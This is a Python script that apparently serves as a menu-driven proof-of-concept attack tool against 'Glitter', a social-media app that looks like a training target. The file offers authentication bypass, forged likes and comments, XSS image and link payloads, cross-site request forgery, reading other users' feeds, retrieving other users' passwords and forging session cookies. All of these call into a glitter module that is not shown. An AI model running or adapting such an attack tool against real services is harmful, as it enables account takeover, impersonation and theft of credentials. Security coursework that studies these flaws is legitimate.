import glitter


def print_menu():
    """
    a function to print the vulnerabilities menu to the user
    :return: none
    """
    print("GLITTER APP AND WEBSITE VULNERABILITY POC\n1. Login into any user (app only)\n2. Send Multiple Likes from Same User\n3. Send glit with different profile image\n4. Send Like with Fake Username\n5. Send Glit with Past Date\n6. Access Other User's Feed\n7. Send to Private Account\n8. Send Glit with Colored Font\n9. Send XSS Image Payload\n10. Send XSS Link Payload\n11. Send Comment with Fake Name\n12. Send Multiple Wows from Same User\n13. XSRF, send a message to yourself from any user that you want\n14. post a video to other user's feed\n15. PASSWORD, get other user's password\n16. COOKIE, get user's cookie\n0. Exit")


def main():
    while True:
        glitter.username = input("Enter your username: ")
        glitter.password = input("Enter your password: ")
        print_menu()
        choice = input("\nEnter your choice: ")
        try:
            choice_int = int(choice)
        except ValueError:
            print("Wrong choice, try again")
            continue
        if choice_int == 0:
            print("Exiting...")
            break
        elif choice_int == 1:
            username = input("Enter username to bypass auth (for example: !@#098): ")
            glitter.login_with_checksum_bypass(username, None)
            if glitter.sock:
                glitter.sock.close()
        elif choice_int in range(2, 13):
            glitter.login_with_checksum_bypass("!@#098", None)
            if choice_int == 2:
                glit_id = input("Enter the glit_id of the glit to like it (for example: 81199): ")
                count = int(input("Enter the amount of likes you would like to do: "))
                glitter.send_multiple_likes(glit_id, count)
            elif choice_int == 3:
                profile_image = input("enter the profile image you want to send a message with (1-8): ")
                glitter.send_glit_with_different_profile_image(profile_image)
            elif choice_int == 4:
                glit_id = input("Enter the glit_id of the glit to like it (for example: 81199): ")
                fake_name = input("enter fake username: ")
                glitter.send_like_with_fake_name(glit_id, fake_name)
            elif choice_int == 5:
                glitter.send_glit_from_past()
            elif choice_int == 6:
                glitter.target_user_id = input("Enter the target's user_id you want to see it's feed (for example: 22779): ")
                glitter.access_other_user_feed()
            elif choice_int == 7:
                glitter.target_user_id = input("Enter the target's user_id you want to send a glit to (for example: 22779): ")
                glitter.send_to_private_account()
            elif choice_int == 8:
                color = input("Enter the color you want the text to be (for example: white, blue, purple): ")
                glitter.send_colored_font_glit(color)
            elif choice_int == 9:
                glitter.send_xss_image_glit()
            elif choice_int == 10:
                glitter.send_xss_link_glit()
            elif choice_int == 11:
                glit_id = input("Enter the glit_id of the glit you want to comment on (for example: 81199): ")
                fake_name = input("enter fake username: ")
                glitter.send_comment_fake_name(glit_id, fake_name)
            elif choice_int == 12:
                glit_id = input("Enter the glit_id of the glit you would send a wow on it(for example: 81199): ")
                count = int(input("Enter the amount of wows you would like to do: "))
                glitter.send_multiple_wows(glit_id, count)
        elif choice_int in range(13, 16):
            glitter.login_website()
            if choice_int == 13:
                glitter.target_user_id = input("Enter the target's user_id you want him to send a message to you (for example: 22779): ")
                glitter.xsrf_send_message_to_yourself_from_another_user(glitter.target_user_id)
            elif choice_int == 14:
                glitter.target_user_id = input("Enter the target's user_id you want to send a video to (for example: 22779): ")
                glitter.post_video_to_another_user_feed()
            elif choice_int == 15:
                glitter.get_password()
        elif choice_int == 16:
            target_username = input("Enter the target's username (for example: !@##@!")
            print("The cookie of " + target_username + ": " + glitter.generate_cookie(target_username))
            if glitter.sock:
                glitter.sock.close()
        else:
            print("Wrong choice, try again")


if __name__ == "__main__":
    main()
